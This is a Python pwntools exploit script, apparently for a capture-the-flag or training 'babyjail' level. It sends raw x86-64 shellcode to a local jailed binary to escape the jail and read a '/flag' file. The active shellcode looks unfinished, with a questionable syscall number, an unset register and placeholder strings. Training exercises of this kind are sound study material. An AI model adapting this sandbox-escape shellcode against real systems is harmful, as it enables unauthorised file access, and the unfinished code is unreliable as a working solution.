from pwn import *

pwnable = './babyjail_level6_testing1'

elf = ELF(pwnable)

context(terminal=['tmux', 'new-window'])

context.log_level = 'DEBUG'
context(os = 'linux', arch = 'amd64')

debug_set_1 = '''
    b main
    b *0x00401705
    b *0x00401416
    '''
    #b *0x5555555554cc
    #b *0x555555555628
    #b *0x555555555634
    #b *0x555555555645
    
    #b *0x5555555555af
    #b *0x5555555554c8

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    #p = process(pwnable)
    #gdb.attach(p, debug_set_1)
    p = gdb.debug([pwnable, '/'], debug_set_1)
else:
    p = process([pwnable, '/'])
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
    #p = process(pwnable, debug_set_1)

shellcode_2 = '''
mov rax, 80
mov rdi, -100
lea rsi, [rip+flag]
xor rdx, rdx
xor rcx, rcx
syscall

xchg rdi, rax
xor rax, rax
mov dl, 100
syscall

xor rax, rax
mov al, 1
mov rdi, 1
syscall

flag:
.string "/flag"
'''

shellcode_3 = '''
mov rax, 80
mov rdi, 0x3
syscall

lea rdi, [rip+flag]
mov rsi, 0 
mov rdx, 0 
syscall

flag:
.string "flag"
'''

#mov rax, 60             # syscall number of exit
#syscall             # trigger exit()

one = "asdasdas"
two = "asdsadasdasd"

#print(pwnlib.shellcraft.amd64.linux.linkat(3, chr(2), None, chr(3), None).rstrip())
#print(pwnlib.shellcraft.amd64.linux.linkat(3, chr(3)).rstrip())


#shellcode = asm(shellcode_2)
shellcode = asm(shellcode_3)
#shellcode = asm(shellcode_2)

p.recvuntil("Let's get started!\n")
p.send(shellcode)
#p.send(shellcode)
p.recvuntil("asdasdasdasdaa")
p.wait_for_close()
